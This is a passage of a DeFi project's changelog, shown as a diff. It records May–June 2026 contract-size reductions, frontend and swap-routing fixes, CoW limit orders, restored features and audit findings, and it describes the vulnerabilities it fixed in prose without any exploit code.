+  were moved off the host `TegridyStaking` in the 2026-05-30 EIP-170 golf and
+  re-exposed on `StakingMonitorView`, but `useUserPosition` and `usePoints` still
+  called them on the host, where they revert.
+- **Price, TVL and points came from the wrong pool.** Same commit, H2 — all three read
+  `TOWELI_WETH_LP_ADDRESS`, the external Uniswap pair, instead of the
+  `TEGRIDY_LP_ADDRESS` pair the relaunch had just created. Gecko chart URLs were
+  deferred rather than repointed at a pool holding nothing.
+- **Swapping was broken for the common case, and it was the last thing found.**
+  `43c3ddbb` (2026-06-08 00:07) — the frontend assumed `SwapFeeRouter` wraps Uniswap,
+  but `DeployMVP` wires it to the native `TegridyRouter`, so a "uniswap"-selected route
+  **sent a Uniswap-priced `minOut` through the thin, unseeded native pool and
+  reverted**. Genuine-Uniswap trades and the aggregator's on-chain Uniswap fallback now
+  execute on `UNISWAP_V2_ROUTER` (6/6 routing tests); `003445e3` the same night routed
+  native-pool volume through `SwapFeeRouter` so the 0.5% is captured on native trades,
+  with the quote comparing the native route *net* of the fee so it is never chosen
+  unless it still beats Uniswap. That capture is **inert as shipped** — while the native
+  pool is thin Uniswap always wins the quote, and the path only activates if deeper POL
+  makes the native venue best-priced. How long a real user could hit the reverting swap
+  path is not derivable from the repo — but it was reachable: `4b5a4e9e`, `608a6c86` and
+  `00a61e5f` all record "Verified live" against a rendered site that evening, hours
+  before the fix.
+- Two more in `0d6e0808`: restaking reads and writes fired at `address(0)` until gated
+  on `isDeployed` (M1), and `AdminPage` read `pendingFeeBps` / `pendingTreasury` off the
+  main router rather than `SwapFeeRouterAdmin`, where the timelock state lives (M2).
+- **The launch caps had no UI, so the chain enforced them through MetaMask.**
+  `ce15b49f` — staking over the 50,000-TOWELI per-wallet cap reverted, and the wallet
+  rendered that as "Likely to Fail"; the form now reads `maxStakePerUser` on-chain,
+  blocks the transaction client-side, and also guards the 100-TOWELI minimum.
+  `69bab395` — staking under the farm's 100-LP `MIN_STAKE` reverted
+  `StakeBelowMinimum()`, which the wallet rendered as a revert-fallback gas estimate
+  (the "$75 phantom"); `MIN_STAKE` is now read on-chain and guarded the same way.
+- **`parseFloat('28,567') === 28`.** `d3d26c7f` — at bootstrap TVL the real base APR is
+  ~28,567%, and `usePoolData` renders anything ≥10,000% as a comma string; every
+  consumer ran `parseFloat` over it, so staking Projected Earnings, the dashboard
+  Earnings Projection and the boost-schedule APY column all rendered roughly 1000x low.
+  Active, not latent. Fixed by exposing a numeric `aprNum` and keeping the comma string
+  for display only.
+- **The old staking contract kept its depositors.** The address `b5e43a91` replaced,
+  `0x626644523d34B84818df602c991B4a06789C4819`, still held a live position (100 TOWELI,
+  tokenId 1, lock expired) on 2026-07-22 — six weeks later — when `718a025c` finally
+  shipped the withdraw-only exit surface. See that entry.
+
+Also that weekend, and recorded here only in its consequences: `38aaad24` (2026-06-07)
+closed three ownership-handoff / access gaps in deferred contracts — the third of them
+the `TegridyV4Hook.setDiscountConfig` EOA / EIP-7702 reject that left
+`test_admin_discountConfigTimelockFlow` red for seven weeks; see the 2026-07-28
+"four CI gates that were passing while running nothing" entry. `2faed429` the same day
+added the gitleaks secret scan and, notably, **added `mvp-launch` to the ci /
+contracts-ci / slither / codeql triggers — the branch this relaunch deployed from had
+until then run none of them.**
+
+### Security — a DUTCH→ALLOWLIST flip re-opened free minting, and lending valued collateral off an ungated TWAP (2026-06-05)
+
+`b4a4cf12`.
+
+A 10-cluster adversarial re-audit of all ~50 contracts returned **0 Crit/High** and two Mediums confirmed against code. A third reported Medium was **disproved** and is recorded as a false positive rather than patched: RevenueDistributor's sweep-vs-recovery accounting is consistent.
+
+- **`TegridyDropV2` (MEDIUM, `contracts/src/TegridyDropV2.sol:708`)** — the H19 "toggle-to-free" guard covered only the PUBLIC phase. ALLOWLIST prices off the same `mintPrice` storage variable, and a DUTCH drop legitimately runs `mintPrice == 0` because its price comes from the curve — so a **DUTCH → ALLOWLIST flip after paid mints re-opened free minting of the remaining supply**, a captured-owner rug of the dutch bidders. The guard now covers PUBLIC *or* ALLOWLIST; DUTCH stays excluded, being curve-priced. *This is the same hole whose PUBLIC half was closed three days earlier in `8360d735` — the fix was correct and incomplete, and the ALLOWLIST path is what the first pass did not reach.*
+- **`TegridyLending._positionETHValue` (MEDIUM)** — consumed `twap.consult()` with no spot-vs-TWAP deviation gate, which `TegridyTWAP`'s own CONSUMER REQUIREMENT NatSpec mandates for **every** `consult()` consumer and which names "lending valuation" as the do-not case. POLAccumulator's 50-bps check was ported over as `_assertSpotWithinTWAP`, so a borrower cannot bend an idle pair's spot price to over-value TOWELI collateral and clear a lender's `minPositionETHValue` floor. Origination-only read; liquidation is time-based and reads no price at all.
+
+`test_NoSpotManipulation_AfterTWAP` was tightened to assert the stronger, **earlier** `ReservesDeviateFromTWAP` revert rather than the one it used to reach. Full suite: 2,104 passed / 0 failed / 0 skipped.
+
+### Changed — TegridyRestaking cut by 4,776 bytes in six passes, and stopped ~2 KB short of deployable (2026-06-04 → 2026-06-05)
+
+`58add7a7`, `c9099b06`, `6603f28f`, `51e8f049`, `40fcbc0e`, `c3bb337a`, `712d7dc5`.
+
+TegridyRestaking was, in the words of the `contracts/foundry.toml` note this sequence deletes, "the only LIVE-on-mainnet candidate currently over EIP-170". Six behaviour-preserving passes took it **31,399 → 26,623 B**; a seventh commit rewrote the note and banked nothing. It is still over, and the value of this sequence is as much the negative result as the bytes: **part 1 predicted that part 2 "brings it under", and part 2 did not.** The closing commit records extraction as floored rather than finished, and that correction is kept here rather than edited away.
+
+Each pass, with what it banked:
+
+- **Part 1 (`58add7a7`) — 31,399 → 28,680 B (−2,719).** Pure internal deduplication: zero external-ABI, fund-logic or permission change, with the extracted helpers byte-for-byte the inlined originals. `updateBonus`'s modifier body collapsed onto the byte-identical `_accrueBonus()`, removing three inlined accrual copies while keeping the raw/unchecked call so the R017 `_accrueBonusChecked` tripwire stays on the claim paths; then `_syncActivePrincipal` (the DR2-01 `totalActivePrincipal` delta-sync) ×4, `_forwardUnforwardedBase` (H-02/S2-05) ×4, `_recoverPriorPending` (DEEP-DR-01) ×2, `_claimBonusWithDefer` (F-04-5) ×3, and `_revalidateBoostCore` shared by the two revalidate entrypoints.
+- **Part 2a (`c9099b06`) — 28,680 → 28,309 B (−371).** The propose/execute/cancel `clearResidualClaimant` cluster moved verbatim into a delegatecall library, `RestakingAdminLib`, on the `TegridyFactoryLib` pattern. **ABI-preserving by construction**: the entrypoints keep their selectors on the host and the library re-declares the events and errors with identical signatures, so a delegatecall still emits from the host address. `PendingResidualClear` moved into the library so the storage-ref type matches across the seam — identical `{address,uint256}` layout, therefore identical slots. Zero test or deploy rewiring; the non-zero-successor guard, the M-03 pending-reject and the 7-day timelock plus validity expiry all preserved.
+- **Part 2b (`6603f28f`) — 28,309 → 27,918 B (−391).** `_settlePreAccrueBonus` (the R014 step-1 settle-on-old-boost-at-pre-accrue block, CEI-anchored before the transfer) and `_returnNftSettleResidual` (the C-1 per-tokenId unsettled drain + `safeTransferFrom` + residual reservation). **This is where the method ran out of road:** via_ir already dedupes most identical blocks, so an internal extraction now nets only ~195 B per lever.
+- **Part 2c (`51e8f049`) — 27,918 → 27,137 B (−781).** The four read-only display views — `pendingBonus`, `pendingBase`, `totalBonusClaimable`, `pendingTotal` — moved to a new read-only sister, `RestakingMonitorView`, mirroring `StakingMonitorView`. They had **zero on-chain consumers, verified across `src/` and `script/`**, and each is reproduced byte-for-byte, reading host state through getters and boost through the lazy-decay-safe `boostedAmountAt`.
+- **Parts 2d and 2e (`40fcbc0e`, `c3bb337a`) — 27,137 → 26,623 B (−514 between them).** The admin execute bodies into the same library, then OZ `SafeERC20`/`SafeCast` swapped for Solady's `SafeTransferLib`/`SafeCastLib` — a drop-in whose header comment justifies it as already-battle-tested here, since TegridyStaking uses `SafeTransferLib` verbatim. **Both commits are subject-only**, so the 514 B is the gap between part 2c's recorded figure and the closing note's, not a number either commit reports.
+
+`712d7dc5` then rewrote the size note in `contracts/foundry.toml`, which had still read "still ~31.3 KB — DEFERRED to Phase 7", and states the position without softening it: 26,623 B, ~15% banked, **still over**; every remaining lever nets only ~70–780 B because wrapper, marshalling and delegatecall overhead offsets the body moved; and the last ~2 KB needs a Phase-7 *architectural* reduction — removing a feature, or relocating the hot-path reward helpers into the library at a delegatecall gas cost — plus a re-audit. The restaking suite's 138 tests are recorded passing at parts 1, 2a, 2b and 2c; parts 2d and 2e record nothing. The full suite was 2,104/0 after the split, per the same note. Being over does not block the relaunch: TegridyRestaking is deliberately absent from both `DeployMVP.s.sol` and `VerifyMVP.s.sol`.
+
+*Two later notes. The 2026-07-23 size-gate entry re-measured the same contract at **26,760 B**, not 26,623, listing it under `OVER_EIP170_DEFERRED`. And `contracts/src/lib/RestakingAdminLib.sol` is **not on the trunk today** — `c749c933` (2026-08-19) re-landed the restaking split in a different shape; `RestakingMonitorView.sol` survived, and the `pendingBonus`/`pendingBase` it absorbed here are exactly the "golfed onto RestakingMonitorView, zero call sites" drift the 2026-07-28 selector guard later found still declared in the frontend ABIs.*
+
+### Fixed — TegridyStaking was seven bytes from undeployable, and the obvious fix was off the table (2026-06-04)
+
+`cae25ec3`.
+
+TegridyStaking's runtime bytecode stood at 24,569 B against the 24,576-byte EIP-170 limit — **7 bytes of margin**. The +39 B won on 2026-05-30 had been eroded by the M-1/M-2/H-E security-fix batches, and **reverting those was not an option, because it would re-introduce the vulnerabilities they closed.**
+
+The buffer was reclaimed the safe way instead. `stakeCapUtilizationBps()` and `stakeCapHeadroom()` are pure off-chain monitoring views with **zero on-chain and zero frontend callers, verified by grep**; both moved from the frozen host to the read-only `StakingMonitorView` sister — the established, already-audited EIP-170 pattern — where they recompute byte-identically from the host's public `maxTotalStaked` and `totalStaked` getters. No fund, permission or state logic was touched; this is a pure view relocation.
+
+- TegridyStaking **24,569 → 24,337 B**, runtime margin +7 → +239.
+- StakingMonitorView 2,278 → 2,909 B (+21,667 margin); its interface gains `maxTotalStaked()`.
+- The StakeCaps test was re-pointed at the sister, and off-chain monitors (Forta/Defender) read these two views from the sister address — identical ABI, identical values.
+
+`forge build --sizes` OK; full suite 2,104/0. *24,337 B is the figure the 2026-07-23 size-gate entry later put into `FLOOR_EXCEPTIONS`, having re-measured against this branch rather than copying `main`'s number.*
+
+### Fixed — offer #0 was invisible and un-borrowable, and a float computed the floor on an already-signed order (2026-06-03)
+
+`9ce9b896`.
+
+An adversarial review of the session's own frontend, indexer and CoW code — the contracts having already been audited clean — returned five findings. The pass also re-verified the three earlier contract fixes (VoteIncentives, CommunityGrants, TegridyDropV2) as **correct and complete**, and found `cowProtocol.ts` and the CoW proxy clean against CoW's canonical spec.
+
+- **`NFTLendingSection` (HIGH, pre-existing)** — BorrowTab read `getOffer(i+1)` rather than `getOffer(i)`. Offer #0 was therefore invisible and un-borrowable, and the last iteration read `getOffer(offerCount)` out of bounds, which reverted. The loan side of the same component had already had this fixed as R011; **the borrow side was the same bug, unmirrored.**
+- **CoW limit order (HIGH)** — the `buyAmount` limit was computed in floating point (`parseFloat × parseFloat → toFixed`), so **the floor on an order the user had already signed could drift below intent**. Now integer fixed-point: `buyAmount = sellAmount × priceBase / 1e18`.
+- **CoW (MEDIUM)** — three glue fixes. The 100-ETH per-order cap existed only as the amount input's `max` attribute and its "Max: 100 ETH" label — **no submit handler on either path actually checked it** — and is now enforced on the CoW path. The WETH balance is checked *before* signing, where the previous code returned a green toast for an order that could never be filled. And a `validTo` beyond uint32 is now rejected outright rather than silently wrapping in the signed order; *the commit message calls this a clamp, but the code refuses.*
+- **Launchpad Live Mint Feed (LOW)** — when a single transaction's mints straddled two poll batches the new quantity was dropped instead of folded into the existing row, undercounting qty.
+- **Indexer (consistency)** — `.onConflictDoNothing()` added to the six `polEvent` inserts for reorg-replay safety, matching the 23 sibling handlers that already had it.
+
+Verified with `tsc -b`, eslint, `vite build`, and cowProtocol 8/8.
+
+### Added — CoW Protocol limit orders that survive the tab closing (2026-06-03)
+
+`d4d6197f`.
+
+The existing limit-order path was a browser keeper: close the tab and the order ceases to exist. This adds a real decentralized path **alongside** it — the keeper is untouched, the change is additive. The user signs an EIP-712 GPv2 order, it is posted to CoW's orderbook, and CoW solvers settle it on-chain when the limit price is met. Gasless to place.
+
+- `frontend/api/aggregator/[provider]/[...path].js` — the hardened cow proxy allowlist widened from quote-only to also permit `POST /orders` and `GET /orders/{uid}`, with the UID validated.
+- `frontend/src/lib/cowProtocol.ts` — GPv2 settlement (`0x9008D19f58AAbD9eD0D60971565AA8510560ab41`) and vault-relayer addresses, the canonical Order EIP-712 type, the appData doc and its hash, order construction and submission shaping, and the proxy URL. 8 unit tests.
+- `frontend/src/hooks/useCowLimitOrder.ts` — approve vault relayer → EIP-712 sign → submit → poll status, with localStorage order tracking. ERC-20 sell only.
+- `LimitOrderTab.tsx` — an additive "Place CoW Order" option plus a list of CoW orders with live status and explorer links.
+
+**Shipped, not live-verified.** Placing and settling a real order needs a wallet on mainnet for the EIP-712 signature and the vault-relayer approval, so what ships is a live-test checklist rather than a result. The commit also notes that the pre-existing `aggregator-proxy.test.js` failure is a stale module path left over from the proxy consolidation and unrelated to this change.
+
+*The unverified half is where it bit. `cowOrderbookUrl` here returns `/api/aggregator/cow/mainnet/api/v1/${path}` — the **unrouted** base that the 2026-07-22 entry records as 404'ing in production, found only when the un-gate put real traffic through it seven weeks later.*
+
+### Added — NFT Launchpad V2 recovered from the commit that deleted it, re-audited, and its deploy gate cleared (2026-06-02 → 2026-06-03)
+
+`8360d735`, `a7ee452d`.
+
+The frontend create-collection wizard had already shipped against the V2 ABIs, but **the contracts behind it did not exist**: they were deleted at the MVP-cut commit `10e1dcc` — the commit is explicit that this was scope, *not* breakage, since they had been through [#50](https://github.com/fomotsar-commits/tegridy-farms/pull/50) plus ownership and sequencer fixes. The most-hardened version was recovered from `1f4197d`: `TegridyDropV2.sol` (OZ ERC721 + ERC2981 + MerkleProof, an Initializable clone template), `TegridyLaunchpadV2.sol` (OZ Clones, an EIP-1167 factory), `DeployLaunchpadV2.s.sol` and five test suites. It compiles clean against the current bases at **21,489 B (drop) and 9,184 B (factory)**, both under EIP-170, and the recovered tests pass as recovered (drop 65/65, factory 12/12, supply invariants 5/5).
+
+It was then re-audited fresh through a 7-agent adversarial workflow with every finding verified against real code. The factory and the clone-init seam came back **clean** — template `_disableInitializers`, atomic clone+init, and a `msg.sender`-bound CREATE2 salt all verified. One MEDIUM was confirmed and fixed here: **`setMintPhase` let a paid DUTCH_AUCTION drop flip to PUBLIC and mint the rest for free.** A dutch drop holds `mintPrice == 0` in storage because its price comes from the curve, so the flip landed in a phase where `mintPrice == 0` means `totalCost == 0`, defeating the H19 toggle-to-free invariant. The guard mirrors the existing phase guards — `if (phase == PUBLIC && mintPrice == 0 && totalSupply > 0) revert ZeroPricePostMint();` — plus two regression tests. *This closed the PUBLIC half only; the ALLOWLIST half of the same hole survived and was found three days later — see the 2026-06-05 entry.*
+
+`forge build` OK; TegridyDropV2 29/29 including the two new tests, factory 12/12, invariants 5/5. Report: `contracts/AUDIT_LAUNCHPADV2_2026_06_02.md`.
+
+Fourteen hours later, on 2026-06-03, `a7ee452d` updated `contracts/RESTORED_FEATURES_DEPLOY_RUNBOOK.md`: the mandated per-feature re-audit gate flipped from "re-audit required" to **CLEARED**, with links to the audit reports, and a Launchpad V2 deploy row was added (`DeployLaunchpadV2.s.sol` → `TEGRIDY_LAUNCHPAD_V2_ADDRESS`; the constructor auto-deploys the drop template; 2-step ownership transfer to the multisig; setting the address auto-un-gates the wizard). The runbook now covers all ten gated features — and **mainnet deploy is an operator action, so none of this is live.**
+
+### Security — a batch claim skipped the window gate, and a governance feature had been bricked by the word `internal` (2026-06-02)
+
+`1b9b2690`.
+
+Pre-deploy audit wave over the nine built-but-undeployed features, adversarial with per-finding verification. Seven came back deploy-ready with **zero surviving exploits**; two confirmed HIGHs — both functional/solvency rather than external theft — were fixed here; Launchpad V2 was blocked outright for having no contract at all, which the entry above resolves later the same day.
+
+- **VoteIncentives (HIGH)** — `claimBribesBatch` omitted the `ClaimWindowNotOpen` gate that single-epoch `claimBribes` enforces. An early batch-claimer could therefore over-share against an **in-flight `totalGaugeVotes` denominator** and drain other pools' commingled balance, breaking `sum(shares) <= bribeAmount`. The per-epoch `voteEnd` gate is now mirrored into the batch loop with continue semantics. 24,274 B, under EIP-170.
+- **CommunityGrants (HIGH)** — `createProposal` called `userPositionCount()`, which is declared `internal` on the live, frozen TegridyStaking and so **has no external selector: every call reverted and the feature was bricked.** It had been masked in testing because `MockVEGrants` exposed the selector the real contract does not. Switched to ERC721 `balanceOf` — TegridyStaking is a SoladyERC721, so the count is identical and the selector is real — **without touching the frozen staking contract**, and the mock was aligned so the same mask cannot recur.
+
+`forge build` OK; CommunityGrants 31/31 including a `createProposal` success case, VoteIncentives 68/68. Report: `contracts/AUDIT_BATCH3_DEPLOY_READINESS_2026_06_02.md`.
+
+*Two forward links, both already in this file. The CommunityGrants defect is the exact class the 2026-07-23 interface-selector guard was built to catch — that entry names this bug on `main` as its motivating case. And this is the fix the preamble's trunk correction refers to by hash: `main`'s PR #100 duplicates it on a branch that is not an ancestor of `mvp-launch`.*
+
+### Added — placeholder UI replaced with on-chain reads, a live APR, and POL events made queryable (2026-06-02)
+
+`3052938f`, `a6df5be0`, `74da1c69`. Three commits across one day — the first two five minutes apart, the indexer one twenty-one hours later — all reusing patterns already proven in this repo rather than adding new surface.
+
+- **Launchpad Live Mint Feed** — was `mockMints`, hardcoded. Now a real `Transfer(from = 0)` `getLogs` feed with a live tail via `useWatchContractEvent`, mirroring AMMSection's PoolTradeHistory. Client-side RPC, **because the Alchemy proxy is allowlisted to three collections** and the launchpad's are not among them.
+- **Launchpad creator dashboard** — a real Unique Minters count where the panel had read `--/Coming soon`.
+- **Treasury "Recent Transactions"** — a real feed through a new hardened, schema-validated Etherscan path (`frontend/src/lib/txHistory.ts`, 191 lines), merging normal and internal ETH flows. The explorer link stays for the full ledger, which includes tokens.
+- **`NFTLendingSection` got the `isDeployed` gate its sibling sections already had** — a latent deploy-gate gap. The stat and batch reads are now `enabled`-gated and all five write handlers guarded, so nothing fires against the zero address pre-deploy.
+- **Dead code deleted** — the V1 `OwnerAdminPanel.tsx` (267 lines, unreferenced, and carrying the *wrong* MintPhase enum) and the orphaned `frontend/src/generated.ts` (6,661 lines of stale wagmi addresses, imported nowhere).
+- **Yield Calculator reads a live APR** (`a6df5be0`) — the HomePage calculator hardcoded a 12% baseline. It now takes the live base APR from `usePoolData()` (`rewardRate × 31536000 / totalBoostedStake`, the same figure StakingCard shows) and scales by the selected boost. The 12% constant survives **only** as the fallback for an undeployed pool or a capped APR on a near-empty one, and the badge switches to "Live X% base APR" when live data is actually there.
+- **POLAccumulator's six business events became queryable** (`74da1c69`) — `Accumulated`, `ETHReceived`, `SweepETHExecuted`, `POLHarvestExecuted`, `SweepTokensExecuted` and `TreasuryChanged` were log-only: a console trace with no table, so treasury and POL activity was visible in indexer logs but **not through GraphQL**. Added a discriminated `pol_event` table on the same pattern as `pair_event`, wired all six handlers to write rows, and removed the now-unused `logEvent` stub — which is what lets the frontend render a POL/treasury feed from the indexer instead of falling back to a block explorer.
+
+Verification recorded: `tsc -b`, `vite build`, and eslint on changed files clean. The commits are explicit about what they did **not** clean up: the **55 failing frontend tests** (errorReporting, useBribes, useSwap, analytics and others) are pre-existing fake-timer and env flakiness, and were confirmed present at baseline HEAD **by stashing rather than by assertion**; on the indexer side the only raw-`tsc` errors are pre-existing drizzle-orm/ponder library-typing noise, with the event argument names validated by the absence of errors in `index.ts`.
+
+### Added — MEV-protection RPC opt-in, and the EIP-5792 foundation every later one-click path is built on (2026-06-01)
+
+`38ac4201`, 575 lines across 8 files, landed on the trunk first-parent line as a single
+non-merge commit that references no PR; its own build log names the branch
+`feat/user-value-tier1`. The first increment off
+[`docs/USER_VALUE_ROADMAP.md`](docs/USER_VALUE_ROADMAP.md), which landed in the same commit.
+One user-facing capability, one foundation with no caller, and one decision record; **the
+audited approve/swap money path is not touched — [`TradePage.tsx`](frontend/src/pages/TradePage.tsx)
+gains exactly five lines, an import and a mounted panel.**
+
+**MEV protection is an opt-in the user confirms, not an RPC swapped underneath them.**
+[`lib/mevProtection.ts`](frontend/src/lib/mevProtection.ts) is 61 pure lines that only
+*build* the request and *classify* the result: `buildMevBlockerChainParams()` returns a
+fresh EIP-3085 `wallet_addEthereumChain` payload naming chain `0x1`
+"Ethereum (MEV Blocker)" and pointing `rpcUrls` at the canonical
+`https://rpc.mevblocker.io/fast`, pinned in the module and explicitly never proxied or
+rewritten. EIP-3085 itself warns that an `rpcUrls` value cannot be assumed honest, which is
+precisely why the wallet prompt — not the app — is the thing that changes anything. The
+panel's "returns 90% of any backrun profit to you" copy is MEV Blocker's own documented
+order-flow-auction rebate, rendered as a vendor claim; nothing in this repo measured it.
+
+**Two of the four states exist because a wallet can refuse without the user refusing.**
+[`useMevProtection.ts`](frontend/src/hooks/useMevProtection.ts) is a four-state machine —
+`idle` / `pending` / `added` / `manual` — and the branch turns on `isUserRejection()`, which
+reads EIP-1193 code `4001` and the string `ACTION_REJECTED`, walking `.cause` to depth 5
+because viem and ethers both wrap provider errors. A deliberate cancel returns to `idle`
+silently. Anything else is a *refusal* — and the code records that some wallets refuse a
+programmatic add for the default mainnet chain — so `manual` renders the RPC URL, chain id 1
+and ETH inline in
+[`MevProtectionPanel.tsx`](frontend/src/components/swap/MevProtectionPanel.tsx) instead of
+dead-ending, with a "Prefer to add it manually?" disclosure showing the same details to
+anyone who never presses the button. `added` is stated just as carefully: it means the
+wallet accepted the network, **not** that transactions are now protected — the toast says
+the user must still select "Ethereum (MEV Blocker)" in the wallet.
+
+**The EIP-5792 half shipped as a foundation with no caller, and that is what makes it worth
+recording.** [`lib/eip5792.ts`](frontend/src/lib/eip5792.ts) is 91 lines written against the
+raw EIP-1193 provider on purpose, so it carries no dependency on a wagmi-experimental export
+surface that moves between minor versions. `isAtomicBatchSupported()` reads
+`capabilities[chainId].atomic.status` and treats both `'supported'` and `'ready'` as "offer
+the one-click path" — the second meaning a wallet can batch pending a one-time EIP-7702
+upgrade prompt — while `'unsupported'` leaves the caller to fall back to sequential
+transactions; the chain-id key is matched case-insensitively because wallets disagree on hex
+casing. `sendCalls()` wraps the v2.0.0 envelope with `atomicRequired` defaulting to `false`.
+On the day, nothing called any of it: the commit records that wiring it into money paths is
+a separate reviewed batch needing live-wallet QA. **Later state, checked 2026-09-04: the
+file has been edited exactly once since (`95660d4c`, 2026-07-18, adding `callsId`), and
+[`useOneClickStake.ts`](frontend/src/hooks/useOneClickStake.ts),
+[`useOneClickLaunchBuy.ts`](frontend/src/hooks/useOneClickLaunchBuy.ts),
+[`useZapRun.ts`](frontend/src/hooks/useZapRun.ts),
+[`lib/stakeBatch.ts`](frontend/src/lib/stakeBatch.ts),
+[`lib/zap/calls.ts`](frontend/src/lib/zap/calls.ts) and
+[`lib/launcher/launchBuy.ts`](frontend/src/lib/launcher/launchBuy.ts) — every one-click
+batch path in the app — import from this module.**
+
+Verified: `tsc --noEmit` clean, ESLint clean, **16 new unit tests** — 9 in
+[`eip5792.test.ts`](frontend/src/lib/eip5792.test.ts) covering `ready` / `unsupported`, mixed
+hex casing, an absent chain and six malformed-capability shapes; 7 in
+[`mevProtection.test.ts`](frontend/src/lib/mevProtection.test.ts) covering the nested-cause
+unwrap, the *non*-rejection `4902` chain-not-added code, and a self-referential `cause` chain
+that would hang an unguarded walk. Not verified, and said so at the time: browser + wallet QA
+and the mobile visual pass were both still pending, and the 76-line panel — hand-tuned
+`text-[11px]` / `text-[10px]` / `min-h-[34px]` mirroring the sibling fee-on-transfer panel —
+has no render test.
+
+**The roadmap is a decision record, not a wish list, and its most expensive output is a
+"no".** [`docs/USER_VALUE_ROADMAP.md`](docs/USER_VALUE_ROADMAP.md) (135 lines) states up front
+that it does not authorize implementation, and the oracle spike it carries **defers a Morpho
+Blue TOWELI/ETH lending market**. `TegridyTWAP` is well-hardened — ≤12h observation window,
+20%-per-step deviation gate, 10-ETH reserve floor, dormancy-bypass cooldowns, sequencer checks
+— but a liquidation-grade oracle's safety rests entirely on TOWELI/WETH pool depth, so the
+~50–100-line `IOracle.price()` adapter is gated on pool TVL ≥ ~$500k (≥ ~150 ETH reserves), a
+governance-locked reserve floor, LLTV ≤ 65% and ≤ 90-day loans. The spike does not claim
+those gates are met: no on-chain TVL is documented and the README calls the pool
+"thin-liquidity", so the recommendation is to keep ERC-20 lending P2P on `TegridyLending`,
+with no oracle at all. The AVOID list is sourced the same way: multiplier points (GMX's own
+governance killed them in May 2024 as disguised dilution), a custom zap router or self-hosted
+paymaster (OpenZeppelin's Beefy-zap audit found a CRITICAL arbitrary-call drain in exactly
+that pattern), and oracle-pooled NFT lending — where BendDAO's 2022 near-insolvency and
+Chainlink's deprecation of NFT floor feeds are recorded as *validating* the repo's existing
+P2P design rather than as a gap in it.
+
+### Added — the nine features cut for the Phase 0 MVP restored, and four ways the codebase had drifted underneath them (2026-05-31)
+
+All nine were restored from `10e1dcc^`, the Phase 0 MVP-cut deletion commit. **Rebuilding them is what surfaced the drift** — each feature had to compile against a tree that had moved on without it.
+
+- `ed3150aa` — **TegridyLPFarming** (1/9), boosted Synthetix-style LP staking. The only work needed was verification: the inlined `ITegridyStakingBoost` interface still matches `TegridyStaking` exactly — the 11-field `Position` struct order (`amount,boostedAmount,rewardDebt,lockEnd,boostBps,lockDuration,autoMaxLock,hasJbacBoost,stakeTimestamp,jbacTokenId,jbacDeposited`) unchanged, and `positions()`/`userTokenId()`/`aggregateActiveBoostBps()` intact. No code changes. 15/15.
+- `f79221e9` — **PremiumAccess** (2/9), the Gold Card subscription. Self-contained — its constructor (`toweli`, `jbacNFT`, `treasury`, `monthlyFee`) depends on no other Tegridy contract, only the TOWELI ERC-20, the JBAC ERC-721 and a treasury address — so no de-drift was needed. 35/35 (28 unit + 5 R022 + 2 invariants at 128k calls, 0 reverts).
+- `159616a9` — **MemeBountyBoard + CommunityGrants** (3-4/9). First drift: `VotePowerOracle.powerOf()` was a deprecated alias that forwarded verbatim to `powerOfLiveUnsafe()`, and the H-10 refactor removed it to force consumers to choose live-vs-epoch-pinned explicitly. The two live reads were repointed (`CommunityGrants:447`, `MemeBountyBoard:480`) — identical semantics, min(historical, current) anti-manipulation clamp preserved. 59/59.
+- `3b457872` — **GaugeController + VoteIncentives** (5-6/9), ve-style gauge voting with commit-reveal plus the Cartman's Market bribe market. The same alias drift at four more sites (`GaugeController:421,715`; `VoteIncentives:645,1559`). Second drift, this one test-only: `VoteIncentives.t.sol`'s `_forceDisableCommitReveal()` helpers poke `commitRevealEnabled` through a hardcoded `vm.store` slot, and base-contract storage had grown since the cut, **moving it from slot 11 to slot 12** — confirmed with `forge inspect ... storageLayout`. Three writes bumped, ten cascading failures cleared, contract logic untouched. 83/83.
+- `1f246006` — **NFT AMM** (7/9): `TegridyNFTPool` plus an EIP-1167 minimal-proxy clone factory, Sudoswap-style linear curve. Third drift: `WETHFallbackLib.safeTransferETHOrWrapNoRevert` had been deleted the previous day as having "zero in-tree consumers" — because its only consumer, this pool, went out in the same original cut. Restored verbatim under the carve-out that deletion note wrote for itself (reintroduce for a batched-payee callsite with consumer-local tests proving the caller credits the stranded path); the pool credits stranded WETH on `mode==2`. Purely additive, so no bytecode change for the live `WETHFallbackLib` consumers. 132/132 across six suites (Pool 27, Factory 14, Reentrancy 6, Sandwich 35, Deep 47, Invariants 3 at 128k calls).
+- `9d89bfe6` — **TegridyLending + TegridyNFTLending** (8-9/9), Gondi-pattern fixed-term P2P loans with no oracles, pro-rata interest, an ETH-floor guard and WETH-fallback payouts. Fourth drift, and the sharpest: `TegridyLending` read collateral through `collateralContract.getPosition(tokenId)`, but `getPosition()` had been extracted to the `StakingMonitorView` sibling the day before and no longer existed at the staking address — a runtime `unrecognized selector 0xeb02c301`. Repointed the `ITegridyStaking` interface and the `acceptOffer` call site to the canonical public `positions` mapping, the same storage source of truth, reading only the two raw fields used (`amount`, `lockEnd`). **One fix cleared all 25 cascading failures.** 136/136. The same commit restored `src/lib/SafeERC721Call.sol` (139 LoC), deleted a day earlier as an orphan for exactly the same reason as the WETH helper.
+
+### Added — per-wave deploy scripts, a runbook that leads with the re-audit gate, and an EIP-170 split that made NFT Lending a two-contract deploy (2026-05-31)
+
+- `e9b06b7d` — eight env-driven deploy scripts modelled on the `DeployV4.s.sol` convention: zero-checked addresses, economic params via `vm.envOr` with last-known defaults and REVIEW notes, multisig `Ownable2Step` handover, and an explicit operator-next-steps block ending in "set the address in `frontend/src/lib/constants.ts` → feature auto-un-gates". `forge build --sizes` confirmed every rebuilt contract under the 24,576-byte limit, and the commit flagged the **tightest margins for future edits: TegridyNFTLending 30 B, VoteIncentives 379 B, TegridyLending 1,822 B**. The only over-limit contracts (TegridyRestaking at 31,399 B and a test mock) are pre-existing, deferred, and deployed by none of these scripts.
